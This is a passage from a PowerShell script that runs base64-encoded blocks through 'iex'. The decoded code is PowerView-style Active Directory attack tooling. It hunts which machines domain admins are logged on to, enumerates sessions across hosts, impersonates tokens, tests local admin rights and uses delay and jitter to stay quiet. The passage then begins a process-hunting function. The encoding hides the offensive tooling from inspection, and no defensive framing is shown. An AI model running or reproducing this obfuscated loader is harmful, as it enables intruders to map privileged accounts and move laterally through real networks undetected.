RvbWFpbiddID0gJFVzZXJEb21haW4gfQogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydVc2VyU2VhcmNoQmFzZSddKSB7ICRHcm91cFNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hCYXNlJ10gPSAkVXNlclNlYXJjaEJhc2UgfQogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXInXSkgeyAkR3JvdXBTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyJ10gPSAkU2VydmVyIH0KICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoU2NvcGUnXSkgeyAkR3JvdXBTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoU2NvcGUnXSA9ICRTZWFyY2hTY29wZSB9CiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1Jlc3VsdFBhZ2VTaXplJ10pIHsgJEdyb3VwU2VhcmNoZXJBcmd1bWVudHNbJ1Jlc3VsdFBhZ2VTaXplJ10gPSAkUmVzdWx0UGFnZVNpemUgfQogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXJUaW1lTGltaXQnXSkgeyAkR3JvdXBTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyVGltZUxpbWl0J10gPSAkU2VydmVyVGltZUxpbWl0IH0KICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVG9tYnN0b25lJ10pIHsgJEdyb3VwU2VhcmNoZXJBcmd1bWVudHNbJ1RvbWJzdG9uZSddID0gJFRvbWJzdG9uZSB9CiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgeyAkR3JvdXBTZWFyY2hlckFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQogICAgICAgICAgICAkVGFyZ2V0VXNlcnMgPSBHZXQtRG9tYWluR3JvdXBNZW1iZXIgQEdyb3VwU2VhcmNoZXJBcmd1bWVudHMgfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSBNZW1iZXJOYW1lCiAgICAgICAgfQogICAgICAgIFdyaXRlLVZlcmJvc2UgIltGaW5kLURvbWFpblVzZXJMb2NhdGlvbl0gVGFyZ2V0VXNlcnMgbGVuZ3RoOiAkKCRUYXJnZXRVc2Vycy5MZW5ndGgpIgogICAgICAgIGlmICgoLW5vdCAkU2hvd0FsbCkgLWFuZCAoJFRhcmdldFVzZXJzLkxlbmd0aCAtZXEgMCkpIHsKICAgICAgICAgICAgdGhyb3cgJ1tGaW5kLURvbWFpblVzZXJMb2NhdGlvbl0gTm8gdXNlcnMgZm91bmQgdG8gdGFyZ2V0JwogICAgICAgIH0KICAgICAgICAkSG9zdEVudW1CbG9jayA9IHsKICAgICAgICAgICAgUGFyYW0oJENvbXB1dGVyTmFtZSwgJFRhcmdldFVzZXJzLCAkQ3VycmVudFVzZXIsICRTdGVhbHRoLCAkVG9rZW5IYW5kbGUpCiAgICAgICAgICAgIGlmICgkVG9rZW5IYW5kbGUpIHsKICAgICAgICAgICAgICAgICROdWxsID0gSW52b2tlLVVzZXJJbXBlcnNvbmF0aW9uIC1Ub2tlbkhhbmRsZSAkVG9rZW5IYW5kbGUgLVF1aWV0CiAgICAgICAgICAgIH0KICAgICAgICAgICAgRm9yRWFjaCAoJFRhcmdldENvbXB1dGVyIGluICRDb21wdXRlck5hbWUpIHsKICAgICAgICAgICAgICAgICRVcCA9IFRlc3QtQ29ubmVjdGlvbiAtQ291bnQgMSAtUXVpZXQgLUNvbXB1dGVyTmFtZSAkVGFyZ2V0Q29tcHV0ZXIKICAgICAgICAgICAgICAgIGlmICgkVXApIHsKICAgICAgICAgICAgICAgICAgICAkU2Vzc2lvbnMgPSBHZXQtTmV0U2Vzc2lvbiAtQ29tcHV0ZXJOYW1lICRUYXJnZXRDb21wdXRlcgogICAgICAgICAgICAgICAgICAgIEZvckVhY2ggKCRTZXNzaW9uIGluICRTZXNzaW9ucykgewogICAgICAgICAgICAgICAgICAgICAgICAkVXNlck5hbWUgPSAkU2Vzc2lvbi5Vc2VyTmFtZQogICAgICAgICAgICAgICAgICAgICAgICAkQ05hbWUgPSAkU2Vzc2lvbi5DTmFtZQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoJENOYW1lIC1hbmQgJENOYW1lLlN0YXJ0c1dpdGgoJ1xcJykpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRDTmFtZSA9ICRDTmFtZS5UcmltU3RhcnQoJ1wnKQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgoJFVzZXJOYW1lKSAtYW5kICgkVXNlck5hbWUuVHJpbSgpIC1uZSAnJykgLWFuZCAoJFVzZXJOYW1lIC1ub3RtYXRjaCAkQ3VycmVudFVzZXIpIC1hbmQgKCRVc2VyTmFtZSAtbm90bWF0Y2ggJ1wkJCcpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoICgtbm90ICRUYXJnZXRVc2VycykgLW9yICgkVGFyZ2V0VXNlcnMgLWNvbnRhaW5zICRVc2VyTmFtZSkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkVXNlckxvY2F0aW9uID0gTmV3LU9iamVjdCBQU09iamVjdAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRVc2VyTG9jYXRpb24gfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnVXNlckRvbWFpbicgJE51bGwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkVXNlckxvY2F0aW9uIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1VzZXJOYW1lJyAkVXNlck5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkVXNlckxvY2F0aW9uIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0NvbXB1dGVyTmFtZScgJFRhcmdldENvbXB1dGVyCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFVzZXJMb2NhdGlvbiB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdTZXNzaW9uRnJvbScgJENOYW1lCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJENOYW1lRE5TTmFtZSA9IFtTeXN0ZW0uTmV0LkRuc106OkdldEhvc3RFbnRyeSgkQ05hbWUpIHwgU2VsZWN0LU9iamVjdCAtRXhwYW5kUHJvcGVydHkgSG9zdE5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFVzZXJMb2NhdGlvbiB8IEFkZC1NZW1iZXIgTm90ZVByb3BlcnR5ICdTZXNzaW9uRnJvbU5hbWUnICRDbmFtZUROU05hbWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkVXNlckxvY2F0aW9uIHwgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgJ1Nlc3Npb25Gcm9tTmFtZScgJE51bGwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRDaGVja0FjY2VzcykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkQWRtaW4gPSAoVGVzdC1BZG1pbkFjY2VzcyAtQ29tcHV0ZXJOYW1lICRDTmFtZSkuSXNBZG1pbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkVXNlckxvY2F0aW9uIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0xvY2FsQWRtaW4nICRBZG1pbi5Jc0FkbWluCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkVXNlckxvY2F0aW9uIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0xvY2FsQWRtaW4nICROdWxsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRVc2VyTG9jYXRpb24uUFNPYmplY3QuVHlwZU5hbWVzLkluc2VydCgwLCAnUG93ZXJWaWV3LlVzZXJMb2NhdGlvbicpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFVzZXJMb2NhdGlvbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGlmICgtbm90ICRTdGVhbHRoKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRMb2dnZWRPbiA9IEdldC1OZXRMb2dnZWRvbiAtQ29tcHV0ZXJOYW1lICRUYXJnZXRDb21wdXRlcgogICAgICAgICAgICAgICAgICAgICAgICBGb3JFYWNoICgkVXNlciBpbiAkTG9nZ2VkT24pIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRVc2VyTmFtZSA9ICRVc2VyLlVzZXJOYW1lCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkVXNlckRvbWFpbiA9ICRVc2VyLkxvZ29uRG9tYWluCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoKCRVc2VyTmFtZSkgLWFuZCAoJFVzZXJOYW1lLnRyaW0oKSAtbmUgJycpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCAoLW5vdCAkVGFyZ2V0VXNlcnMpIC1vciAoJFRhcmdldFVzZXJzIC1jb250YWlucyAkVXNlck5hbWUpIC1hbmQgKCRVc2VyTmFtZSAtbm90bWF0Y2ggJ1wkJCcpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRJUEFkZHJlc3MgPSBAKFJlc29sdmUtSVBBZGRyZXNzIC1Db21wdXRlck5hbWUgJFRhcmdldENvbXB1dGVyKVswXS5JUEFkZHJlc3MKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFVzZXJMb2NhdGlvbiA9IE5ldy1PYmplY3QgUFNPYmplY3QKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFVzZXJMb2NhdGlvbiB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdVc2VyRG9tYWluJyAkVXNlckRvbWFpbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkVXNlckxvY2F0aW9uIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1VzZXJOYW1lJyAkVXNlck5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFVzZXJMb2NhdGlvbiB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdDb21wdXRlck5hbWUnICRUYXJnZXRDb21wdXRlcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkVXNlckxvY2F0aW9uIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0lQQWRkcmVzcycgJElQQWRkcmVzcwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkVXNlckxvY2F0aW9uIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1Nlc3Npb25Gcm9tJyAkTnVsbAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkVXNlckxvY2F0aW9uIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1Nlc3Npb25Gcm9tTmFtZScgJE51bGwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRDaGVja0FjY2VzcykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEFkbWluID0gVGVzdC1BZG1pbkFjY2VzcyAtQ29tcHV0ZXJOYW1lICRUYXJnZXRDb21wdXRlcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFVzZXJMb2NhdGlvbiB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdMb2NhbEFkbWluJyAkQWRtaW4uSXNBZG1pbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFVzZXJMb2NhdGlvbiB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdMb2NhbEFkbWluJyAkTnVsbAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRVc2VyTG9jYXRpb24uUFNPYmplY3QuVHlwZU5hbWVzLkluc2VydCgwLCAnUG93ZXJWaWV3LlVzZXJMb2NhdGlvbicpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRVc2VyTG9jYXRpb24KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKCRUb2tlbkhhbmRsZSkgewogICAgICAgICAgICAgICAgSW52b2tlLVJldmVydFRvU2VsZgogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgICRMb2dvblRva2VuID0gJE51bGwKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsKICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRGVsYXknXSAtb3IgJFBTQm91bmRQYXJhbWV0ZXJzWydTdG9wT25TdWNjZXNzJ10pIHsKICAgICAgICAgICAgICAgICRMb2dvblRva2VuID0gSW52b2tlLVVzZXJJbXBlcnNvbmF0aW9uIC1DcmVkZW50aWFsICRDcmVkZW50aWFsCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAkTG9nb25Ub2tlbiA9IEludm9rZS1Vc2VySW1wZXJzb25hdGlvbiAtQ3JlZGVudGlhbCAkQ3JlZGVudGlhbCAtUXVpZXQKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KICAgIFBST0NFU1MgewogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0RlbGF5J10gLW9yICRQU0JvdW5kUGFyYW1ldGVyc1snU3RvcE9uU3VjY2VzcyddKSB7CiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltGaW5kLURvbWFpblVzZXJMb2NhdGlvbl0gVG90YWwgbnVtYmVyIG9mIGhvc3RzOiAkKCRUYXJnZXRDb21wdXRlcnMuY291bnQpIgogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbRmluZC1Eb21haW5Vc2VyTG9jYXRpb25dIERlbGF5OiAkRGVsYXksIEppdHRlcjogJEppdHRlciIKICAgICAgICAgICAgJENvdW50ZXIgPSAwCiAgICAgICAgICAgICRSYW5kTm8gPSBOZXctT2JqZWN0IFN5c3RlbS5SYW5kb20KICAgICAgICAgICAgRm9yRWFjaCAoJFRhcmdldENvbXB1dGVyIGluICRUYXJnZXRDb21wdXRlcnMpIHsKICAgICAgICAgICAgICAgICRDb3VudGVyID0gJENvdW50ZXIgKyAxCiAgICAgICAgICAgICAgICBTdGFydC1TbGVlcCAtU2Vjb25kcyAkUmFuZE5vLk5leHQoKDEtJEppdHRlcikqJERlbGF5LCAoMSskSml0dGVyKSokRGVsYXkpCiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbRmluZC1Eb21haW5Vc2VyTG9jYXRpb25dIEVudW1lcmF0aW5nIHNlcnZlciAkQ29tcHV0ZXIgKCRDb3VudGVyIG9mICQoJFRhcmdldENvbXB1dGVycy5Db3VudCkpIgogICAgICAgICAgICAgICAgSW52b2tlLUNvbW1hbmQgLVNjcmlwdEJsb2NrICRIb3N0RW51bUJsb2NrIC1Bcmd1bWVudExpc3QgJFRhcmdldENvbXB1dGVyLCAkVGFyZ2V0VXNlcnMsICRDdXJyZW50VXNlciwgJFN0ZWFsdGgsICRMb2dvblRva2VuCiAgICAgICAgICAgICAgICBpZiAoJFJlc3VsdCAtYW5kICRTdG9wT25TdWNjZXNzKSB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0ZpbmQtRG9tYWluVXNlckxvY2F0aW9uXSBUYXJnZXQgdXNlciBmb3VuZCwgcmV0dXJuaW5nIGVhcmx5IgogICAgICAgICAgICAgICAgICAgIHJldHVybgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbRmluZC1Eb21haW5Vc2VyTG9jYXRpb25dIFVzaW5nIHRocmVhZGluZyB3aXRoIHRocmVhZHM6ICRUaHJlYWRzIgogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbRmluZC1Eb21haW5Vc2VyTG9jYXRpb25dIFRhcmdldENvbXB1dGVycyBsZW5ndGg6ICQoJFRhcmdldENvbXB1dGVycy5MZW5ndGgpIgogICAgICAgICAgICAkU2NyaXB0UGFyYW1zID0gQHsKICAgICAgICAgICAgICAgICdUYXJnZXRVc2VycycgPSAkVGFyZ2V0VXNlcnMKICAgICAgICAgICAgICAgICdDdXJyZW50VXNlcicgPSAkQ3VycmVudFVzZXIKICAgICAgICAgICAgICAgICdTdGVhbHRoJyA9ICRTdGVhbHRoCiAgICAgICAgICAgICAgICAnVG9rZW5IYW5kbGUnID0gJExvZ29uVG9rZW4KICAgICAgICAgICAgfQogICAgICAgICAgICBOZXctVGhyZWFkZWRGdW5jdGlvbiAtQ29tcHV0ZXJOYW1lICRUYXJnZXRDb21wdXRlcnMgLVNjcmlwdEJsb2NrICRIb3N0RW51bUJsb2NrIC1TY3JpcHRQYXJhbWV0ZXJzICRTY3JpcHRQYXJhbXMgLVRocmVhZHMgJFRocmVhZHMKICAgICAgICB9CiAgICB9CiAgICBFTkQgewogICAgICAgIGlmICgkTG9nb25Ub2tlbikgewogICAgICAgICAgICBJbnZva2UtUmV2ZXJ0VG9TZWxmIC1Ub2tlbkhhbmRsZSAkTG9nb25Ub2tlbgogICAgICAgIH0KICAgIH0KfQo=")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gRmluZC1Eb21haW5Qcm9jZXNzIHsKICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1Nob3VsZFByb2Nlc3MnLCAnJyldCiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNVc2VQU0NyZWRlbnRpYWxUeXBlJywgJycpXQogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTQXZvaWRVc2luZ1BsYWluVGV4dEZvclBhc3N3b3JkJywgJycpXQogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5Vc2VyUHJvY2VzcycpXQogICAgW0NtZGxldEJpbmRpbmcoRGVmYXVsdFBhcmFtZXRlclNldE5hbWUgPSAnTm9uZScpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW0FsaWFzKCdETlNIb3N0TmFtZScpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkQ29tcHV0ZXJOYW1lLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQ29tcHV0ZXJEb21haW4sCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRDb21wdXRlckxEQVBGaWx0ZXIsCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRDb21wdXRlclNlYXJjaEJhc2UsCiAgICAgICAgW0FsaWFzKCdVbmNvbnN0cmFpbmVkJyldCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkQ29tcHV0ZXJVbmNvbnN0cmFpbmVkLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdPcGVyYXRpbmdTeXN0ZW0nKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRDb21wdXRlck9wZXJhdGluZ1N5c3RlbSwKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnU2VydmljZVBhY2snKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRDb21wdXRlclNlcnZpY2VQYWNrLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdTaXRlTmFtZScpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJENvbXB1dGVyU2l0ZU5hbWUsCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gJ1RhcmdldFByb2Nlc3MnKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkUHJvY2Vzc05hbWUsCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gJ1RhcmdldFVzZXInKV0KICAgICAgICBbUGFyYW1ldGVyKFBhcmFtZXRlclNldE5hbWUgPSAnVXNlcklkZW50aXR5JyldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJFVzZXJJZGVudGl0eSwKICAgICAgICBbUGFyYW1ldGVyKFBhcmFtZXRlclNldE5hbWUgPSAnVGFyZ2V0VXNlcicpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkVXNlckRvbWFpbiwKICAgICAgICBbUGFyYW1ldGVyKFBhcmFtZXRlclNldE5hbWUgPSAnVGFyZ2V0VXNlcicpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkVXNlckxEQVBGaWx0ZXIsCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gJ1RhcmdldFVzZXInKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFVzZXJTZWFyY2hCYXNlLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdHcm91cE5hbWUnLCAnR3JvdXAnKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJFVzZXJHcm91cElkZW50aXR5ID0gJ0RvbWFpbiBBZG1pbnMnLAogICAgICAgIFtQYXJhbWV0ZXIoUGFyYW1ldGVyU2V0TmFtZSA9ICdUYXJnZXRVc2VyJyldCiAgICAgICAgW0FsaWFzKCdBZG1pbkNvdW50JyldCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkVXNlckFkbWluQ291bnQsCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0RvbWFpbkNvbnRyb2xsZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZXJ2ZXIsCiAgICAgICAgW1ZhbGlkYXRlU2V0KCdCYXNlJywgJ09uZUxldmVsJywgJ1N1YnRyZWUnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZWFyY2hTY29wZSA9ICdTdWJ0cmVlJywKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkUmVzdWx0UGFnZVNpemUgPSAyMDAsCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFNlcnZlclRpbWVMaW1pdCwKICAgICAgICBbU3dpdGNoXQogICAgICAgICRUb21ic3RvbmUsCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5LAogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFN0b3BPblN1Y2Nlc3MsCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJERlbGF5ID0gMCwKICAgICAgICBbVmFsaWRhdGVSYW5nZSgwLjAsIDEuMCldCiAgICAgICAgW0RvdWJsZV0KICAgICAgICAkSml0dGVyID0gLjMsCiAgICAgICAgW0ludF0KICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDApXQogICAgICAgICRUaHJlYWRzID0gMjAKICAgICkKICAgIEJFR0lOIHsKICAgICAgICAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50cyA9IEB7CiAgICAgICAgICAgICdQcm9wZXJ0aWVzJyA9ICdkbnNob3N0bmFtZScKICAgICAgICB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ0RvbWFpbiddID0gJERvbWFpbiB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ29tcHV0ZXJEb21haW4nXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snRG9tYWluJ10gPSAkQ29tcHV0ZXJEb21haW4gfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NvbXB1dGVyTERBUEZpbHRlciddKSB7ICRDb21wdXRlclNlYXJjaGVyQXJndW1lbnRzWydMREFQRmlsdGVyJ10gPSAkQ29tcHV0ZXJMREFQRmlsdGVyIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDb21wdXRlclNlYXJjaEJhc2UnXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoQmFzZSddID0gJENvbXB1dGVyU2VhcmNoQmFzZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVW5jb25zdHJhaW5lZCddKSB7ICRDb21wdXRlclNlYXJjaGVyQXJndW1lbnRzWydVbmNvbnN0cmFpbmVkJ10gPSAkVW5jb25zdHJhaW5lZCB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ29tcHV0ZXJPcGVyYXRpbmdTeXN0ZW0nXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snT3BlcmF0aW5nU3lzdGVtJ10gPSAkT3BlcmF0aW5nU3lzdGVtIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDb21wdXRlclNlcnZpY2VQYWNrJ10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZpY2VQYWNrJ10gPSAkU2VydmljZVBhY2sgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NvbXB1dGVyU2l0ZU5hbWUnXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snU2l0ZU5hbWUnXSA9ICRTaXRlTmFtZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyJ10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlciddID0gJFNlcnZlciB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoU2NvcGUnXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoU2NvcGUnXSA9ICRTZWFyY2hTY29wZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmVzdWx0UGFnZVNpemUnXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snUmVzdWx0UGFn